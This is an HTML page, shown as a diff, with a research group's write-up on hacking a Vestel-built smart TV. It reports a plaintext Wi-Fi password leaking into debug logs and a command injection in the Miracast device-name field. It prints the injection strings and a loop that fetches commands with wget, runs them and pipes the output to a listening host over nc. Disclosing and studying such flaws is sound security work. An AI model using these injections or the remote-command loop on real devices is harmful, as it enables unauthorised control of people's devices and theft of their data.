@@ -1,191 +1,58 @@
-<!DOCTYPE html>
-<html><head>
-    <meta charset="utf-8" />
-    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
-    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />
-
-    <title>Hacking A Vestel TV - 0DRG</title>
-
-    
-    
-    <meta name="description" content="Hacking A Vestel Smart TV The 0DRG group decided to look at a readily avaliable voxicom smart TV as the first target. The Voxicon smart TV is a rebranding of a Vestel TV, from a Turkish TV manufacturer. Vestel makes TV&rsquo;s for several well known vendors:
- Toshiba Hitatchi Medion Polaroid Finlux  The TV&rsquo;s come repackaged with a vendor specific config, but seem to otherwise be the same.
-We found several bugs in the Vestel firmware:" />
-    <meta name="author" content="" />
-    
-
-    <link href="https://unpkg.com/@master/normal.css" rel="stylesheet">
-    <script src="https://unpkg.com/@master/style@1.5.0"></script>
-    <script src="https://unpkg.com/@master/styles@1.13.0"></script>
-    <script src="https://unpkg.com/master-styles-group"></script>
-    <script src="https://unpkg.com/themes.js"></script>
-    <script>window.themes = window.themes || new window.Themes()</script></head>
-<body class="bg:fade-84@dark font:fade-16@dark">
-    <nav class="w:full h:90 fixed bg:fade-84/.95@dark bg:white z:1000">
-    <div class="
-        h:full
-        w:full
-        max-w:1200
-        mx:auto
-        px:32
-        d:flex
-        align-items:center
-    ">
-        <div>
-            <a href="/" class="mr-3 font:extralight">
-              
-              0DRG
-              
-            </a>
-        </div>
-
-        <div class="ml:auto">
-            
-            
-            
-        </div>
-    </div>
-</nav>
-<div class="d:flex flex:column@<=sm pt:90 px:24 jc:center gap:44 word-break:break-word">
-        <div class="max-w:700 w:full box:content-box">
-<article class="box:border-box pt:32">
-    <header class="mb:32">
-        <div class="font:40 font:extrabold">Hacking A Vestel TV</div>
-        <div class="mt:16 f:fade-60">
-            <time>Feb 7, 2023</time>
-            </div>
-    </header><div class="
-    _:where(a):hover{text-decoration-color:fade}
-    _:where(a){text-decoration:2;underline;fade-10;_text-decoration-color:fade-70@dark}
-    _:where(blockquote){bl:5;solid;fade-76/.1;_bl:5;solid;fade-34/.1@dark}
-    _:where(code){font:90%;_v:middle}
-    _:where(code:not(.highlight_*,pre_*)){p:2;6;_r:4}
-    _:where(del){text-decoration:1;line-through;fade-68;_text-decoration-color:red-64@dark}
-    _:where(figcaption){text:14;_p:10;20;0;_width:fit;_mx:auto;_font:fade-56;_font:fade-57@dark}
-    _:where(h1){font:40;_font:extrabold}
-    _:where(h1,h2,h3)+:where(h1,h2,h3){mt:.5em}
-    _:where(h1,h2,h3,h4,h5,h6){mt:2em}
-    _:where(h2){mb:1em;_font:32}
-    _:where(h3){font:24}
-    _:where(h4){font:20}
-    _:where(h5){font:16}
-    _:where(h6){font:14}
-    _:where(li)::marker{font:fade-44;_font:fade-68@dark}
-    _:where(li){pl:.375em}
-    _:where(mark){text-decoration:1;underline;#fce016;_bg:transparent;_text-decoration-color:rgb(252;224;22/.5)@dark}
-    _:where(p,li){font:fade-76;_font:16;_line-height:1.65;_font:fade-34@dark}
-    _:where(p,pre,blockquote,figure,ul,ol,table){my:1.125em}
-    >:first-child{mt:0!}
-    _:where(pre){p:20;_r:8;_overflow:auto}
-    _:where(pre,code:not(.highlight_*)){bg:fade-2;_bg:fade-92!@dark}
-    _:where(strong,b,a,code:not(.highlight_*),mark,del){font:fade-92;_font:fade-12@dark}
-    _:where(table){width:full;_border-spacing:0}
-    _:where(td){v:baseline}
-    _:where(td,th):first-child{pl:0}
-    _:where(td,th):last-child{pr:0}
-    _:where(td,th){bb:1;solid;fade-92/.06;_p:6;_b:fade-4/.04@dark}
-    _:where(th){font:fade-78;_font:14;_text:left;_font:fade-12@dark}
-    _:where(th,p_code,li_code,a,mark){font:semibold;_font:medium@dark}
-    _:where(ul){list-style-type:disc}
-    _:where(ul,ol,blockquote){pl:1.5em}
-    _:where(video,img){max-width:full}
-    _:where(a,mark){text-underline-offset:3}
-"><h1 id="hacking-a-vestel-smart-tv">Hacking A Vestel Smart TV</h1>
-<p>The 0DRG group decided to look at a readily avaliable voxicom smart TV as the first target.
+<!doctype html><html lang=en-us><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta http-equiv=x-ua-compatible content="IE=edge"><title>Hacking A Vestel TV</title><link rel=stylesheet href=https://0DayResearchGroup.github.io/css/layout.min.54dfaecc026a6a7933dbc56e12e3261222487b80e88714fda88ad00bfa27bd29.css id=layoutCss><link rel=stylesheet href=https://0DayResearchGroup.github.io/css/themes/alexpate-34.min.1b3c204b6c0fada8d418e4ec1a6c4eac240dca94d0e04de64bab269da45d6eab.css id=themeCss></head><body><script>var switchTheme=function(e){document.getElementById("themeCss").href=`/gohugo-hacker/css/themes/${e}.css?${+new Date}`}</script><div class=theme-switcher><button class=alexpate-15 class=alexpate-15 onclick='switchTheme("alexpate-15")'>alexpate-15</button>
+<button class=alexpate-2 onclick='switchTheme("alexpate-2")'>alexpate-2</button>
+<button class=alexpate-20 onclick='switchTheme("alexpate-20")'>alexpate-20</button>
+<button class=alexpate-26 onclick='switchTheme("alexpate-26")'>alexpate-26</button>
+<button class=alexpate-3 onclick='switchTheme("alexpate-3")'>alexpate-3</button>
+<button class=alexpate-31 onclick='switchTheme("alexpate-31")'>alexpate-31</button>
+<button class=alexpate-34 onclick='switchTheme("alexpate-34")'>alexpate-34</button>
+<button class=alexpate-42 onclick='switchTheme("alexpate-42")'>alexpate-42</button>
+<button class=alexpate-54 onclick='switchTheme("alexpate-54")'>alexpate-54</button>
+<button class=alexpate-65 onclick='switchTheme("alexpate-65")'>alexpate-65</button>
+<button class=alexpate-72 onclick='switchTheme("alexpate-72")'>alexpate-72</button>
+<button class=alexpate-91 onclick='switchTheme("alexpate-91")'>alexpate-91</button>
+<button class=alexpate-96 onclick='switchTheme("alexpate-96")'>alexpate-96</button>
+<button class=default onclick='switchTheme("default")'>default</button>
+<button class=monochrome-dark onclick='switchTheme("monochrome-dark")'>monochrome-dark</button>
+<button class=monochrome-light onclick='switchTheme("monochrome-light")'>monochrome-light</button>
+<button class=ubuntu onclick='switchTheme("ubuntu")'>ubuntu</button>
+<button class=xterm onclick='switchTheme("xterm")'>xterm</button></div><main><article><h1>Hacking A Vestel TV</h1><time>7 February 2023 21:23 Tuesday</time><div><h1 id=hacking-a-vestel-smart-tv>Hacking A Vestel Smart TV</h1><p>The 0DRG group decided to look at a readily avaliable voxicom smart TV as the first target.
 The Voxicon smart TV is a rebranding of a Vestel TV, from a Turkish TV manufacturer.
-Vestel makes TV&rsquo;s for several well known vendors:</p>
-<ol>
-<li>Toshiba</li>
-<li>Hitatchi</li>
-<li>Medion</li>
-<li>Polaroid</li>
-<li>Finlux</li>
-</ol>
-<p>The TV&rsquo;s come repackaged with a vendor specific config, but seem to otherwise be the same.</p>
-<p>We found several bugs in the Vestel firmware:</p>
-<ol>
-<li>Plaintext WPA password disclosed in logs</li>
-<li>Command injection in device name</li>
-</ol>
-<h1 id="background">Background</h1>
-<p>We started our analysis by exploring the functionality of the TV.
+Vestel makes TV&rsquo;s for several well known vendors:</p><ol><li>Toshiba</li><li>Hitatchi</li><li>Medion</li><li>Polaroid</li><li>Finlux</li></ol><p>The TV&rsquo;s come repackaged with a vendor specific config, but seem to otherwise be the same.</p><p>We found several bugs in the Vestel firmware:</p><ol><li>Plaintext WPA password disclosed in logs</li><li>Command injection in device name</li></ol><h1 id=background>Background</h1><p>We started our analysis by exploring the functionality of the TV.
 It contains what you would expect from a modern smart TV,
 including a webbrowser, apps, and an appstore.
 Despite the TV looking like it was build with android, the appstore contained
-next to no apps.</p>
-<p>Some TV&rsquo;s come installed with the google play store, if that is the case then
-a good first step is to download termux or similar.</p>
-<p>Since this was not the case we were stuck with exploring the UI.</p>
-<p>This yielded very little in the begging, so we decided to unscrew the backpanel
-to get access to the main board.</p>
-<p>The back panel came off easily and we could locate the mainboard, that contained the board model.
-<img src="/Images/vestel_board_image.jpg" alt="Picture of the board"></p>
-<p>The model of the board is <code>Vestel17B180E</code>, a bit of googling revealed the service manual <a href="https://portal.repairtech.co.uk/downloads/17MB180E_SERVICE_MANUAL.PDF">here</a>.
-This shows a bunch of useful info, we might have needed if we didn&rsquo;t find another bug.</p>
-<p>Googling vestel TV functionality led to the discovery of the debug menu.
-This can be entered by:</p>
-<ol>
-<li>Pressing home on the remote</li>
-<li>Pressing <code>4725</code> on the numpad</li>
-</ol>
-<p><img src="/Images/vestel_debug_menu.jpg" alt="Debug menu"></p>
-<p>The above screenshot shows an option regarding UART, which made us hopeful for UART access.
-Despite a few hours of trial and error, we did not manage to read data from it however.</p>
-<h1 id="plaintext-password-disclosure">Plaintext Password Disclosure</h1>
-<p>This bug is less severe but quite fun.
+next to no apps.</p><p>Some TV&rsquo;s come installed with the google play store, if that is the case then
+a good first step is to download termux or similar.</p><p>Since this was not the case we were stuck with exploring the UI.</p><p>This yielded very little in the begging, so we decided to unscrew the backpanel
+to get access to the main board.</p><p>The back panel came off easily and we could locate the mainboard, that contained the board model.
+<img src=/Images/vestel_board_image.jpg alt="Picture of the board"></p><p>The model of the board is <code>Vestel17B180E</code>, a bit of googling revealed the service manual <a href=https://portal.repairtech.co.uk/downloads/17MB180E_SERVICE_MANUAL.PDF>here</a>.
+This shows a bunch of useful info, we might have needed if we didn&rsquo;t find another bug.</p><p>Googling vestel TV functionality led to the discovery of the debug menu.
+This can be entered by:</p><ol><li>Pressing home on the remote</li><li>Pressing <code>4725</code> on the numpad</li></ol><p><img src=/Images/vestel_debug_menu.jpg alt="Debug menu"></p><p>The above screenshot shows an option regarding UART, which made us hopeful for UART access.
+Despite a few hours of trial and error, we did not manage to read data from it however.</p><h1 id=plaintext-password-disclosure>Plaintext Password Disclosure</h1><p>This bug is less severe but quite fun.
 By dumping the logs to a FAT32 formatted thumbrive, using the dump logs option in the debug screen,
 we noticed the plaintext password of the wifi&rsquo;s we had recently connected to.
 Despite this not being a severe vulnerability, it still meant we could dump the phone hotspot passwords
-of the TV&rsquo;s in our uni. Since most students would connect the TV to their phones hotspot if need be.</p>
-<p>The password shows up in a log line looking like:</p>
-<pre tabindex="0"><code>[PskEncryption, 1778]cmd = wpa_passphrase &#34;wifi-name&#34; &#34;password&#34;| grep &#39;\spsk=&#39;
-</code></pre><h1 id="command-injection">Command Injection</h1>
-<p>The OS contains a command injection vulnerability in the device name.
+of the TV&rsquo;s in our uni. Since most students would connect the TV to their phones hotspot if need be.</p><p>The password shows up in a log line looking like:</p><pre tabindex=0><code>[PskEncryption, 1778]cmd = wpa_passphrase &#34;wifi-name&#34; &#34;password&#34;| grep &#39;\spsk=&#39;
+</code></pre><h1 id=command-injection>Command Injection</h1><p>The OS contains a command injection vulnerability in the device name.
 By selecting <code>wifi display</code> as a source, a new menu item will appear in the settings menu.
 This option is for changing the device name of the TV in wifi peering mode.
 Changing this option triggers the following command to be run as the aurora user:
-<code>sed -i 's/^device_name=.*/device_name=; [user input]' /conf/Miracast_Adapter.config</code></p>
-<p>We could confirm the vulnerability by entering <code>'; reboot &amp;'</code>, which would reboot the TV.</p>
-<h2 id="getting-useful-execution">Getting useful execution</h2>
-<p>Rebooting is not a very useful primitive. We want to execute anything on the device.
+<code>sed -i 's/^device_name=.*/device_name=; [user input]' /conf/Miracast_Adapter.config</code></p><p>We could confirm the vulnerability by entering <code>'; reboot &'</code>, which would reboot the TV.</p><h2 id=getting-useful-execution>Getting useful execution</h2><p>Rebooting is not a very useful primitive. We want to execute anything on the device.
 This presented a problem because the input field for the device name was limited to 20 chars.
-Two of which would go to the initial escape chars, so we&rsquo;re left with 18 characters of injection.</p>
-<p>A quick brainstorm was made, and it was decided that the easiest method of payload delivery would be
-through the USB port.</p>
-<p>Essentially, because the TV auto mounts any FAT32 usb that gets inserted, the mount path just needed to be short enough to put in the field. We could then put an executable named a single char, and get it to run.</p>
-<p>Revisiting the logs, we found the mountpoint to be <code>/mnt/hd0a/</code> for our USB.
-We then compiled a reverse shell to the specific ARM chip and executed:</p>
-<pre tabindex="0"><code>&#39;;/mnt/hd0a/a &amp;&#39;
-</code></pre><p>But nothing&hellip;</p>
-<p>It turns out that for some reason the FAT32 did not support us making the file executable.
+Two of which would go to the initial escape chars, so we&rsquo;re left with 18 characters of injection.</p><p>A quick brainstorm was made, and it was decided that the easiest method of payload delivery would be
+through the USB port.</p><p>Essentially, because the TV auto mounts any FAT32 usb that gets inserted, the mount path just needed to be short enough to put in the field. We could then put an executable named a single char, and get it to run.</p><p>Revisiting the logs, we found the mountpoint to be <code>/mnt/hd0a/</code> for our USB.
+We then compiled a reverse shell to the specific ARM chip and executed:</p><pre tabindex=0><code>&#39;;/mnt/hd0a/a &amp;&#39;
+</code></pre><p>But nothing&mldr;</p><p>It turns out that for some reason the FAT32 did not support us making the file executable.
 Annoying as that was, we managed to sidestep the issue using <code>sh</code> and shellscripts instead.
-In  most shells you can execute <code>sh&lt;script.sh</code> which is equivalent to <code>cat script.sh | sh</code>.
-The file does not need to be executable because <code>sh</code> will be interpreting the script directly from stdin.</p>
-<pre tabindex="0"><code>&#39;;sh&lt;/mnt/hd0a/a &amp;&#39;
+In most shells you can execute <code>sh&lt;script.sh</code> which is equivalent to <code>cat script.sh | sh</code>.
+The file does not need to be executable because <code>sh</code> will be interpreting the script directly from stdin.</p><pre tabindex=0><code>&#39;;sh&lt;/mnt/hd0a/a &amp;&#39;
 </code></pre><p>This ended up being the final payload, with a shell script that would reboot the device.
-<img src="/Images/vestel_shell_inject.jpg" alt="Shell injection"></p>
-<p>Once we had access to the files on the TV, we were able to find the actual vulnerability doing some reverse engineering. It is located in the <strong>ICE_WiDiResetFriendlyName</strong> function of the aurora.elf file.</p>
-<h2 id="getting-a-shell-ish">Getting a shell (ish)</h2>
-<p>We tried various reverse shell payloads on the TV, but nothing worked.
-After messing about with this for a few hours (we needed to manually insert the injection, as well as replace the file on the USB every time), we decided on going 100% jank and creating a pseudo shell instead.</p>
-<p>The final shell would look like the following:</p>
-<pre tabindex="0"><code>while True
+<img src=/Images/vestel_shell_inject.jpg alt="Shell injection"></p><p>Once we had access to the files on the TV, we were able to find the actual vulnerability doing some reverse engineering. It is located in the <strong>ICE_WiDiResetFriendlyName</strong> function of the aurora.elf file.</p><h2 id=getting-a-shell-ish>Getting a shell (ish)</h2><p>We tried various reverse shell payloads on the TV, but nothing worked.
+After messing about with this for a few hours (we needed to manually insert the injection, as well as replace the file on the USB every time), we decided on going 100% jank and creating a pseudo shell instead.</p><p>The final shell would look like the following:</p><pre tabindex=0><code>while True
 do
 wget http://192.168.0.6:8000/cmd -O - | sh 2&amp;&gt;1 | nc 192.168.0.6 8888 
 sleep 2
 done
 </code></pre><p>On the networked machine, we would then start a webserver serving the <code>cmd</code> file with the command we wanted to run, as well as a listener with <code>nc</code> on port 8888 to recieve the results.
-This worked, and we could browse the system without having to unplug and replug a USB for every command.</p>
-<h2 id="further-analysis">Further Analysis</h2>
-<p>After messing around in the file system as a restricted user, we wanted to step up and find some over the air vulnerability.
+This worked, and we could browse the system without having to unplug and replug a USB for every command.</p><h2 id=further-analysis>Further Analysis</h2><p>After messing around in the file system as a restricted user, we wanted to step up and find some over the air vulnerability.
 We also wanted to explore the oppertunities for rooting the device.
-This is still on the drawing block.</p>
-</div></article>
-<footer class="py:24">
-    <div class="f:fade-30 f:14 mb:8"></div>
-    <div class="f:fade-60 f:12">Theme <a class="f:bold" href="https://github.com/serkodev/holy" _target="_blank">Holy</a></div>
-</footer></div>
-    </div>
-</body>
-
-</html>
+This is still on the drawing block.</p></div><div class=tags></div></article></main><aside><div class=latest-posts><h3>latest posts</h3><ul><li><a href=/posts/lan_to_root_zyxel/>Lan_To_Root_Zyxel</a></li><li><a href=/posts/hacking_a_vestel_tv/>Hacking A Vestel TV</a></li></ul></div></aside></body></html>
